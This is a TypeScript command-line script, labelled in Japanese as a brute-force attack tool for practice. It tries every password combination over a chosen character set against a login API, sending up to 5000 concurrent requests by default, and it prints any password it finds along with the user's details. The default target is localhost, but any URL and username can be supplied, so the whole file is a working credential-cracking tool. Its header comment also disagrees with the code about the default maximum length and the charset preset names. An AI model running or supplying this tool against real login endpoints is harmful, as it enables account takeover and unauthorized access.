#!/usr/bin/env tsx
/**
 * brute-force.ts
 * ブルートフォース攻撃ツール（実習用）
 *
 * すべての文字の組み合わせを順番に試行します。
 *
 * 使い方:
 *   npm run brute -- --target <username> [options]
 *
 * オプション:
 *   --target       <string>   攻撃対象のユーザー名 (必須)
 *   --charset      <string>   使用する文字セット (デフォルト: "digits")
 *                             プリセット: digits, lower, upper, alpha, alnum, all
 *                             またはカスタム文字列を直接指定可能 (例: "abc123")
 *   --min-length   <number>   パスワードの最小文字数 (デフォルト: 1)
 *   --max-length   <number>   パスワードの最大文字数 (デフォルト: 6)
 *   --url          <string>   ベースURL (デフォルト: http://localhost:3000)
 *   --limit        <number>   試行上限数 (デフォルト: 無制限)
 *   --concurrency  <number>   同時リクエスト数 (デフォルト: 5000)
 *   --log-interval <number>   進捗ログを出力する試行間隔 (デフォルト: 1)
 *   --verbose                 全試行のログを出力 (--log-interval より優先)
 *   --resume       <string>   途中再開する開始パスワード (例: "aab")
 */

import { Pool } from 'undici';

// ─── 文字セットプリセット ─────────────────────────────────────────────────────

const CHARSETS: Record<string, string> = {
  digits: '0123456789',
  lower:  'abcdefghijklmnopqrstuvwxyz',
  upper:  'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
  alpha:  'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
  alnum:  'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
  strong:    'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?/',
};

// ─── CLI 引数パース ────────────────────────────────────────────────────────────

const args = process.argv.slice(2);

function getArg(flag: string): string | undefined {
  const idx = args.indexOf(flag);
  return idx !== -1 ? args[idx + 1] : undefined;
}

function hasFlag(flag: string): boolean {
  return args.includes(flag);
}

const TARGET       = getArg('--target');
const CHARSET_KEY  = getArg('--charset') ?? 'digits';
const CHARSET      = CHARSETS[CHARSET_KEY] ?? CHARSET_KEY; // プリセットかカスタム文字列
const MIN_LENGTH   = getArg('--min-length')   ? parseInt(getArg('--min-length')!,   10) : 1;
const MAX_LENGTH   = getArg('--max-length')   ? parseInt(getArg('--max-length')!,   10) : 4;
const BASE_URL     = getArg('--url')          ?? 'http://localhost:3000';
const LIMIT        = getArg('--limit')        ? parseInt(getArg('--limit')!,        10) : Infinity;
const CONCURRENCY  = getArg('--concurrency')  ? parseInt(getArg('--concurrency')!,  10) : 5000;
const LOG_INTERVAL = getArg('--log-interval') ? parseInt(getArg('--log-interval')!, 10) : 1;
const VERBOSE      = hasFlag('--verbose');
const RESUME       = getArg('--resume') ?? null;
const API_URL      = `${BASE_URL}/api`;

if (!TARGET) {
  console.error(JSON.stringify({
    event: 'error',
    timestamp: new Date().toISOString(),
    message: '--target オプションは必須です。例: npm run brute -- --target admin',
  }, null, 2));
  process.exit(1);
}

if (MIN_LENGTH < 1 || MAX_LENGTH < MIN_LENGTH) {
  console.error(JSON.stringify({
    event: 'error',
    timestamp: new Date().toISOString(),
    message: `不正な長さ指定: min=${MIN_LENGTH}, max=${MAX_LENGTH}`,
  }, null, 2));
  process.exit(1);
}

// ─── 総組み合わせ数を計算 ──────────────────────────────────────────────────────

function calcTotalCombinations(charsetLen: number, minLen: number, maxLen: number): number {
  let total = 0;
  for (let len = minLen; len <= maxLen; len++) {
    total += Math.pow(charsetLen, len);
  }
  return total;
}

const TOTAL_COMBINATIONS = calcTotalCombinations(CHARSET.length, MIN_LENGTH, MAX_LENGTH);

// ─── セマフォ（O(1) 並行制御）──────────────────────────────────────────────────

class Semaphore {
  private permits: number;
  private readonly queue: Array<() => void> = [];

  constructor(permits: number) {
    this.permits = permits;
  }

  acquire(): Promise<void> {
    if (this.permits > 0) {
      this.permits--;
      return Promise.resolve();
    }
    return new Promise<void>((resolve) => this.queue.push(resolve));
  }

  release(): void {
    if (this.queue.length > 0) {
      this.queue.shift()!();
    } else {
      this.permits++;
    }
  }
}

// ─── ログ出力ヘルパー ──────────────────────────────────────────────────────────

function log(obj: Record<string, unknown>): void {
  console.log(JSON.stringify({ timestamp: new Date().toISOString(), ...obj }));
}

// ─── パスワード生成（ジェネレーター）──────────────────────────────────────────

function* generatePasswords(
  charset: string,
  minLen: number,
  maxLen: number,
  resume?: string | null,
): Generator<string> {
  const base = charset.length;
  let shouldYield = !resume; // resume指定がなければ最初からyield

  for (let len = minLen; len <= maxLen; len++) {
    // 各長さの全組み合わせをインデックスで列挙
    const total = Math.pow(base, len);

    for (let i = 0; i < total; i++) {
      // インデックス → パスワード文字列変換
      let pw = '';
      let num = i;
      for (let pos = 0; pos < len; pos++) {
        pw = charset[num % base] + pw;
        num = Math.floor(num / base);
      }

      // resume指定がある場合、そのパスワードに到達するまでスキップ
      if (!shouldYield) {
        if (pw === resume) {
          shouldYield = true;
        }
        continue;
      }

      yield pw;
    }
  }
}

// ─── ログイン試行（undici Pool で接続再利用）──────────────────────────────────

let _pool: Pool | null = null;
function getPool(): Pool {
  if (!_pool) {
    const url = new URL(BASE_URL);
    _pool = new Pool(`${url.protocol}//${url.host}`, {
      connections: CONCURRENCY,
      pipelining: 1,
      keepAliveTimeout:    30_000,
      keepAliveMaxTimeout: 30_000,
    });
  }
  return _pool;
}

async function tryLogin(username: string, password: string): Promise<{
  success: boolean;
  status: number;
  body: unknown;
}> {
  const url  = new URL(BASE_URL);
  const path = `${url.pathname.replace(/\/$/, '')}/api`;
  const { statusCode, body } = await getPool().request({
    path,
    method:  'POST',
    headers: { 'content-type': 'application/json' },
    body:    JSON.stringify({ username, password }),
  });
  const data = await body.json();
  return { success: statusCode === 200, status: statusCode, body: data };
}

// ─── メイン処理 ───────────────────────────────────────────────────────────────

async function main(): Promise<void> {
  const startTime = Date.now();

  log({
    event: 'start',
    target: TARGET,
    charset: CHARSET_KEY !== CHARSET ? `${CHARSET_KEY} (${CHARSET.length} chars)` : `custom (${CHARSET.length} chars)`,
    charset_preview: CHARSET.length > 40 ? CHARSET.substring(0, 40) + '…' : CHARSET,
    min_length: MIN_LENGTH,
    max_length: MAX_LENGTH,
    total_combinations: TOTAL_COMBINATIONS,
    api_url: API_URL,
    limit: LIMIT === Infinity ? 'unlimited' : LIMIT,
    concurrency: CONCURRENCY,
    log_interval: VERBOSE ? 'verbose (all)' : LOG_INTERVAL,
    verbose: VERBOSE,
    resume: RESUME ?? 'none',
  });

  let attempt       = 0;
  let queued        = 0;
  let found         = false;
  let foundPassword: string | null = null;

  // Semaphore で O(1) の並行制御（Promise.race による O(n) スキャンを排除）
  const sem = new Semaphore(CONCURRENCY);

  const runOne = async (password: string): Promise<void> => {
    await sem.acquire();
    if (found) {
      sem.release();
      return;
    }
    try {
      const result = await tryLogin(TARGET!, password);
      attempt++;

      if (VERBOSE) {
        log({
          event: result.success ? 'hit' : 'miss',
          attempt,
          target: TARGET,
          password,
          status: result.status,
        });
      } else if (attempt % LOG_INTERVAL === 0) {
        const elapsedSec = ((Date.now() - startTime) / 1000).toFixed(1);
        const rate       = (attempt / parseFloat(elapsedSec)).toFixed(0);
        const progress   = TOTAL_COMBINATIONS < Infinity
          ? ((attempt / TOTAL_COMBINATIONS) * 100).toFixed(2) + '%'
          : 'N/A';
        log({
          event: 'progress',
          attempts: attempt,
          total_combinations: TOTAL_COMBINATIONS,
          progress,
          concurrency: CONCURRENCY,
          elapsed_sec: parseFloat(elapsedSec),
          rate_per_sec: parseInt(rate, 10),
          last_password: password,
        });
      }

      if (result.success) {
        found         = true;
        foundPassword = password;
        const user    = (result.body as { user?: Record<string, unknown> }).user ?? null;
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
        const message = `Target:${TARGET} Password:${foundPassword}`;

        // ─── 見つけた！バナー（stderr に出力） ──────────────────────────────
        const W      = 62;
        const border = '★'.repeat(W);
        const pad    = (text: string) => {
          const space = W - 2 - text.length;
          const l     = Math.floor(space / 2);
          const r     = space - l;
          return `★${' '.repeat(l)}${text}${' '.repeat(r)}★`;
        };

        console.error('');
        console.error(border);
        console.error(pad(''));
        console.error(pad('🎉  パスワードが見つかりました！  🎉'));
        console.error(pad(''));
        console.error(border);
        console.error('');
        console.error('┌─────────────────────────────────────────────────────┐');
        console.error(`│  👤 ユーザー名  ：  ${TARGET!.padEnd(30)} │`);
        console.error(`│  🔑 パスワード  ：  ${foundPassword!.padEnd(30)} │`);
        console.error('├─────────────────────────────────────────────────────┤');
        console.error(`│  🔢 試行回数    ：  ${String(attempt).padEnd(30)} │`);
        console.error(`│  ⏱  経過時間    ：  ${(elapsed + '秒').padEnd(30)} │`);
        console.error(`│  👥 ユーザー情報：  ${(user ? JSON.stringify(user) : 'なし').substring(0, 30).padEnd(30)} │`);
        console.error('└─────────────────────────────────────────────────────┘');
        console.error('');

        log({
          event: 'success',
          target: TARGET,
          password: foundPassword,
          attempt,
          elapsed_sec: parseFloat(elapsed),
          user,
          message,
        });
      }
    } catch (err) {
      attempt++;
      log({ event: 'request_error', attempt, password, error: String(err) });
    } finally {
      sem.release();
    }
  };

  // 全パスワードをすぐにディスパッチ（Semaphore がバックプレッシャーを担う）
  const generator = generatePasswords(CHARSET, MIN_LENGTH, MAX_LENGTH, RESUME);
  const dispatched: Promise<void>[] = [];

  for (const password of generator) {
    if (found) break;

    if (queued >= LIMIT) {
      log({ event: 'limit_reached', limit: LIMIT, attempts: queued });
      break;
    }

    queued++;
    dispatched.push(runOne(password));
  }

  await Promise.allSettled(dispatched);

  // 接続プールを閉じてプロセスが hang しないようにする
  if (_pool) await _pool.close();

  const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);

  if (!found) {
    log({
      event: 'exhausted',
      target: TARGET,
      total_attempts: attempt,
      total_combinations: TOTAL_COMBINATIONS,
      elapsed_sec: parseFloat(elapsed),
      message: 'すべての組み合わせを試行しましたが、一致するパスワードは見つかりませんでした。',
    });
  }

  if (found) {
    log({
      event: 'end',
      result: '!!!!! PASSWORD FOUND !!!!!',
      target: TARGET,
      password: `>>>  ${foundPassword}  <<<`,
      total_attempts: attempt,
      total_combinations: TOTAL_COMBINATIONS,
      elapsed_sec: parseFloat(elapsed),
      rate_per_sec: attempt > 0 ? parseFloat((attempt / parseFloat(elapsed)).toFixed(1)) : 0,
      message: `パスワードが見つかりました！ ユーザー「${TARGET}」のパスワードは「${foundPassword}」です`,
    });
  } else {
    log({
      event: 'end',
      result: 'not_found',
      target: TARGET,
      total_attempts: attempt,
      total_combinations: TOTAL_COMBINATIONS,
      elapsed_sec: parseFloat(elapsed),
      rate_per_sec: attempt > 0 ? parseFloat((attempt / parseFloat(elapsed)).toFixed(1)) : 0,
      message: 'パスワードは見つかりませんでした',
    });
  }
}

main().catch((err) => {
  log({ event: 'fatal', error: String(err) });
  process.exit(1);
});
